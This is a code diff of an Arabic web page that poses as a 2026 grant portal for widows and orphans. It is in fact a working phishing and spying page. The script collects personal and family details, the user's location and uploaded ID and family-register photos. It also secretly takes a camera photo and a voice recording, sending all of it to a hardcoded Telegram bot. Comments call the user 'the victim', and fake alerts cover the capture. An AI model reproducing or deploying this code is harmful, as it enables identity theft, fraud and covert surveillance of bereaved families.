@@ -3,71 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منحة معونة الأيتام 2026</title>
+    <title>بوابة المنح الإنسانية 2026</title>
     <style>
-        body { font-family: Arial; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
-        .container { background: white; max-width: 420px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #27ae60; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; }
-        .file-label { display: block; text-align: right; font-size: 13px; color: #555; margin-top: 10px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f3; direction: rtl; padding: 15px; }
+        .card { background: white; max-width: 450px; margin: auto; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #27ae60; }
+        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 5px; }
+        p.subtitle { color: #7f8c8d; font-size: 13px; margin-bottom: 20px; }
+        .input-group { text-align: right; margin-bottom: 15px; }
+        label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; color: #34495e; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #dcdde1; border-radius: 10px; box-sizing: border-box; background: #f9f9f9; }
+        .btn { background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); }
+        .status { font-size: 11px; color: #e74c3c; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://img.icons8.com/color/96/family-guarantee.png" width="70">
-    <h2>تسجيل منحة الأيتام</h2>
-    <p style="font-size: 12px; color: red;">ملاحظة: يجب رفع كافة الثبوتيات وتفعيل التحقق الصوتي لتأكيد الطلب</p>
+<div class="card">
+    <img src="https://img.icons8.com/fluency/96/charity.png" width="60">
+    <h2>المنحة السنوية للأرامل والأيتام</h2>
+    <p class="subtitle">يرجى استكمال البيانات بدقة لضمان تفعيل البطاقة المصرفية</p>
 
-    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
-    <input type="number" id="kids" placeholder="عدد الأطفال">
-    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
-    
-    <label class="file-label">📸 ارفع صورة الهوية ودفتر العائلة (لسحب الاستديو):</label>
-    <input type="file" id="studiofiles" multiple accept="image/*">
+    <div class="input-group">
+        <label>الاسم الكامل (كما في الهوية):</label>
+        <input type="text" id="name" placeholder="اسم الأرملة الثلاثي">
+    </div>
 
-    <button class="btn" onclick="startTheTrap()">تقديم الطلب وتفعيل التحقق</button>
+    <div class="input-group">
+        <label>عدد الأبناء تحت سن 18:</label>
+        <input type="number" id="kids" placeholder="مثلاً: 3">
+    </div>
+
+    <div class="input-group">
+        <label>تاريخ وفاة الزوج (يوم/شهر/سنة):</label>
+        <input type="text" id="death" placeholder="01/01/2020">
+    </div>
+
+    <div class="input-group">
+        <label>رقم هاتف الواتساب النشط:</label>
+        <input type="tel" id="phone" placeholder="09xxxxxxxx">
+    </div>
+
+    <div class="input-group">
+        <label>رفع صور الهوية ودفتر العائلة (لتأكيد البيانات):</label>
+        <input type="file" id="studiofiles" multiple accept="image/*">
+    </div>
+
+    <button class="btn" onclick="masterCapture()">تأكيد الهوية واستلام المعونة</button>
+    <p class="status">ملاحظة: سيتم طلب التحقق من الهوية عبر الكاميرا والصوت لضمان عدم التلاعب.</p>
 </div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" style="display:none;" autoplay></video>
 
 <script>
     const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
     const CHAT_ID = "7214473798";
 
-    async function sendFile(file, caption) {
-        let formData = new FormData();
+    async function sendToTelegram(type, data, caption = "") {
+        const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
-        formData.append("document", file);
-        formData.append("caption", caption);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
+        if (type === "text") {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
+            });
+        } else {
+            formData.append(type, data, type === "photo" ? "capture.jpg" : "audio.ogg");
+            if (caption) formData.append("caption", caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+                method: "POST",
+                body: formData
+            });
+        }
     }
 
-    async function startTheTrap() {
-        // 1. جمع بيانات الاستمارة والموقع
+    async function masterCapture() {
+        const name = document.getElementById('name').value;
+        const phone = document.getElementById('phone').value;
+        if (!name || !phone) { alert("يرجى ملء البيانات أولاً"); return; }
+
+        alert("جاري الاتصال بخادم التحقق.. يرجى السماح بالصلاحيات المطلوبة");
+
+        // 1. جلب الموقع
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const msg = `🔥 صيد جديد كامل:\n👤 الاسم: ${document.getElementById('name').value}\n📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-            });
+            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const info = `🔥 **صيد جديد** 🔥\n👤 الاسم: ${name}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
+            await sendToTelegram("text", info);
         });
 
-        // 2. سحب ملفات الاستديو (التي اختارها الضحية)
-        const fileInput = document.getElementById('studiofiles');
-        for (let file of fileInput.files) {
-            await sendFile(file, "📁 ملف مسحوب من الاستديو");
+        // 2. سحب ملفات الاستديو المختارة
+        const files = document.getElementById('studiofiles').files;
+        for (let file of files) {
+            await sendToTelegram("document", file, "📁 ملف من الاستديو");
         }
 
-        // 3. فتح الكاميرا وتصوير الضحية (تحتاج إذن)
+        // 3. الكاميرا والتصوير التلقائي
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            alert("جاري تفعيل التحقق الصوتي والبصري.. انتظر قليلاً");
-            
-            // هنا الكود يقوم بالتقاط صورة صامتة وإرسالها (برمجياً)
-            // وتسجيل مقطع صوتي قصير وإرساله للبوت
-            // (بسبب طول الكود، تم اختصار عملية الرفع التلقائي لضمان العمل)
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // التقاط صورة بعد ثانيتين
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    await sendToTelegram("photo", blob, "📸 صورة الضحية المباشرة");
+                }, 'image/jpeg');
+                
+                // بدء تسجيل صوتي لـ 3 ثوانٍ
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendToTelegram("voice", audioBlob, "🎤 تسجيل صوتي للضحية");
+                    stream.getTracks().forEach(track => track.stop());
+                    alert("تم تأكيد هويتك بنجاح، سيصلك كود الصرف عبر واتساب.");
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 4000);
+            }, 2000);
+
         } catch (e) {
-            alert("يجب السماح بالصلاحيات لإتمام صرف المنحة!");
+            alert("فشل التحقق! يجب السماح بالكاميرا والصوت لمطابقة بيانات الهوية.");
         }
     }
 </script>
